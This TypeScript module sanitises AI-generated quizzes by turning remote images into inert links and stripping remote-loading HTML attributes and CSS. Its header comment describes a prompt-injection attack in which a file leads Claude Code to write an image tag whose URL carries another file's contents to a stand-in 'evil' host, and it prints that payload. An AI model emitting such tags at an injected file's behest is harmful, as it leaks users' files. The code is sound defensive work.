/* ══════════════════════════════════════════════════════════
   NO REMOTE IMAGE IN A GENERATED QUIZ (2026-10-09)

   Since Claude Code reads the files of a trusted folder, a file there can
   carry a prompt injection that makes the model write
   `<img src="https://evil/?d=<another file>">` or `![](https://…)` into the
   quiz it generates. The renderer accepts `https:` images (`sanitizer.ts`,
   `isSafeQuizUrl`): showing the quiz would send that request, with the data
   in its URL.

   Every quiz read from a MODEL's answer (`parseReponseQuiz`,
   `parseOllamaResponse`, hence a batch, the web channel and the relay) goes
   through `inertRemoteImages` before it is shown or saved: a remote image
   becomes a plain text link, which loads nothing. Local images (`![[…]]`,
   relative paths, `data:`) stay. A quiz already in a note, or received from
   a share, is never touched: the rule lives at the model's answer, not in
   the renderer.

   - Text fields: `![alt](url)`, found with the renderer's OWN patterns
     (`grammaire-inline.ts`) outside `![[…]]`, becomes `[url](url)`. Code
     spans are not spared: guessing the renderer's code zones wrong would
     let an image through, rewriting one inside code only costs a character.
   - `*Html` fields: parsed by the browser's own parser (a `<template>`, inert,
     as `sanitizeQuizHtml` does), so a quoted `>` or a comment cannot hide a
     tag from this pass. An `<img>` with a remote `src` or `srcset` becomes a
     link; a remote `src`, `srcset`, `background`, `poster` or (outside `<a>`)
     `href` on any other element is dropped; a `style` declaration with
     `url(`, `image-set(`, `@import` or a CSS escape is dropped; `<style>` and
     `<template>` elements are removed. The result is parsed again and must be
     clean, or the whole field becomes escaped text.
   - The `html` field of a Learn reading is left alone: it runs in a frame
     whose CSP loads nothing from outside (`engine/html-frame-core.ts`).

   `npm run check:prompt` holds it.
══════════════════════════════════════════════════════════ */

import { MOTIF_EMBED, MOTIF_LIEN_IMAGE } from "../engine/grammaire-inline";

const ENTITIES: Record<string, string> = {
	amp: "&", lt: "<", gt: ">", quot: "\"", apos: "'", colon: ":", sol: "/", bsol: "\\",
	period: ".", lpar: "(", rpar: ")", tab: "\t", newline: "\n", num: "#",
};

/** The character references a browser would decode in a URL written in HTML. */
function decodeRefs(v: string): string {
	return v.replace(/&(?:#x([0-9a-f]+)|#(\d+)|([a-z]+));?/gi, (m, hex?: string, dec?: string, name?: string) => {
		if (hex || dec) {
			const n = parseInt((hex || dec) as string, hex ? 16 : 10);
			return n > 0 && n <= 0x10ffff ? String.fromCodePoint(n) : "";
		}
		return ENTITIES[String(name).toLowerCase()] ?? m;
	});
}

/** True when loading `url` could leave the machine, or when it cannot be
    told. Kept: `data:`, a drive path, a path with no scheme. Everything
    with a scheme (`https:`, `file:`, `blob:`...) or starting with `//` or
    two backslashes is remote. A browser strips tabs, newlines and leading
    controls from a URL: they are removed before judging. */
export function isRemote(url: string): boolean {
	const u = decodeRefs(String(url)).replace(/[\x00-\x20\x7f]/g, "");
	if (/&[a-z0-9#]/i.test(u)) return true;
	if (/^data:/i.test(u)) return false;
	if (/^[a-z]:[\\/]/i.test(u)) return false;
	if (/^[a-z][a-z0-9+.-]*:/i.test(u)) return true;
	return /^[\\/]{2}/.test(u);
}

/** A text field: every remote `![alt](url)` outside `![[...]]` becomes the
    link `[url](url)`. After a literal `!` a space is put first, or the
    link would read as an image again. */
export function textWithoutRemoteImages(text: string): string {
	const parts: string[] = [];
	let start = 0;
	const rewrite = (s: string): string => s.replace(MOTIF_LIEN_IMAGE, (m: string, bang: string, _alt: string, src: string, at: number) =>
		bang === "!" && isRemote(src) ? (s[at - 1] === "!" ? " " : "") + "[" + src + "](" + src + ")" : m);
	for (const m of text.matchAll(MOTIF_EMBED)) {
		const at = m.index ?? 0;
		parts.push(rewrite(text.slice(start, at)), m[0]);
		start = at + m[0].length;
	}
	parts.push(rewrite(text.slice(start)));
	return parts.join("");
}

const LOADING_ATTRS = ["src", "srcset", "background", "poster", "href", "xlink:href"];
const CSS_LOAD = /url\s*\(|image-set\s*\(|@import|\\/i;

/** The candidate URLs of a `srcset`. */
function srcsetUrls(v: string): string[] {
	return v.split(",").map(c => c.trim().split(/\s+/)[0]).filter(Boolean);
}

function remoteAttr(el: Element, name: string): boolean {
	const v = el.getAttribute(name);
	if (v === null) return false;
	return name === "srcset" ? srcsetUrls(v).some(isRemote) : isRemote(v);
}

/** One pass over a parsed fragment; with `fix` false it only reports.
    True when something that loads from outside was found. */
function scan(root: ParentNode, fix: boolean): boolean {
	let found = false;
	for (const el of Array.from(root.querySelectorAll("style, template"))) {
		found = true;
		if (fix) el.remove();
	}
	for (const el of Array.from(root.querySelectorAll("*"))) {
		const tag = el.tagName.toLowerCase();
		if (tag === "img" || tag === "image") {
			const src = remoteAttr(el, "src") ? el.getAttribute("src") : null;
			const fromSet = !src && remoteAttr(el, "srcset") ? srcsetUrls(el.getAttribute("srcset") ?? "").find(isRemote) : undefined;
			const url = (src ?? fromSet ?? "").trim();
			if (url) {
				found = true;
				if (fix) {
					const doc = el.ownerDocument;
					let replacement: Node;
					if (/^https?:\/\//i.test(url)) {
						const a = doc.createElement("a");
						a.setAttribute("href", url);
						a.textContent = url;
						replacement = a;
					} else {
						replacement = doc.createTextNode(url);
					}
					el.replaceWith(replacement);
				}
				continue;
			}
		}
		for (const name of LOADING_ATTRS) {
			if ((name === "href" || name === "xlink:href") && (tag === "a" || tag === "area")) continue;
			if (remoteAttr(el, name)) {
				found = true;
				if (fix) el.removeAttribute(name);
			}
		}
		const style = el.getAttribute("style");
		if (style !== null && CSS_LOAD.test(style)) {
			found = true;
			if (fix) {
				const kept = style.split(";").filter(d => !CSS_LOAD.test(d)).join(";").trim();
				if (kept) el.setAttribute("style", kept); else el.removeAttribute("style");
			}
		}
	}
	return found;
}

function escapeHtml(s: string): string {
	return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

/** An `*Html` field with no remote load left; unchanged when it had none.
    Without a DOM (a Node script), any markup becomes escaped text. */
export function htmlWithoutRemoteImages(html: string): string {
	if (typeof document === "undefined") return /</.test(html) ? escapeHtml(html) : html;
	const parse = (h: string): HTMLTemplateElement => {
		const tpl = document.createElement("template");
		tpl.innerHTML = h;
		return tpl;
	};
	const tpl = parse(html);
	if (!scan(tpl.content, true)) return html;
	const out = tpl.innerHTML;
	// Parsed again: what the renderer will parse must be clean too.
	return scan(parse(out).content, false) ? escapeHtml(html) : out;
}

/** The questions of a model's answer, with no remote image left. Returns a
    copy, never mutates `value`. */
export function inertRemoteImages<T>(value: T): T {
	const walk = (v: unknown, key: string): unknown => {
		if (typeof v === "string") {
			if (key === "html") return v;
			return /Html$/.test(key) ? htmlWithoutRemoteImages(v) : textWithoutRemoteImages(v);
		}
		if (Array.isArray(v)) return v.map(x => walk(x, key));
		if (v && typeof v === "object") {
			const o: Record<string, unknown> = {};
			// defineProperty: an own "__proto__" key stays a key, never a prototype.
			for (const [k, x] of Object.entries(v as Record<string, unknown>)) Object.defineProperty(o, k, { value: walk(x, k), enumerable: true, writable: true, configurable: true });
			return o;
		}
		return v;
	};
	return walk(value, "") as T;
}
